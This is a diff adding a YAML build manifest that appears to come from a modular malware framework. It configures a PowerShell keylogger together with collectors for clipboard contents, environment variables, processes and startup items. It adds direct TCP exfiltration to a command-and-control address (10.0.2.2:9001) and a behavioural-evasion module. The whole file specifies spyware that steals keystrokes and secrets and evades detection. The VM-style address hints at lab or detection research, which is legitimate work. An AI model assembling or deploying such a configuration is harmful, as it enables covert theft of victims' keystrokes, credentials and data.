@@ -1,0 +1,24 @@
+name: keylogger_powershell
+description: Keylogger with direct TCP exfil — env vars + startup items
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/env_vars
+  - collectors/startup_items
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
